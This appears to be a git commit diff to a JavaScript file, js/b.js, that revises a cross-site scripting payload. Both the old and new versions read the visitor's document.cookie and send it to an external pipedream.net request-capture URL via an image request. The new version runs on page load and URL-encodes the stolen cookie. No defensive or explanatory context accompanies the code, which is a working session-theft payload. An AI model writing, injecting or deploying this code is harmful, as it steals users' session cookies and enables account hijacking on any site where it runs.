8b2ac4449a7932300e1ac45702c55b50a0f3eea1
RhyRu9 <164749781+RHYru9@users.noreply.github.com>
2024-10-29 13:39:34 +0700

    Update b.js

--- js/b.js
+++ js/b.js
@@ -1,3 +1,6 @@
-<script>
-  new Image().src='https://eoow6y96ffo9mzx.m.pipedream.net/?cookie='+document.cookie;
+<script type="text/javascript">
+  window.onload = function() {
+    var img = new Image();
+    img.src = 'https://eoow6y96ffo9mzx.m.pipedream.net/log?c=' + encodeURIComponent(document.cookie);
+  };
 </script>
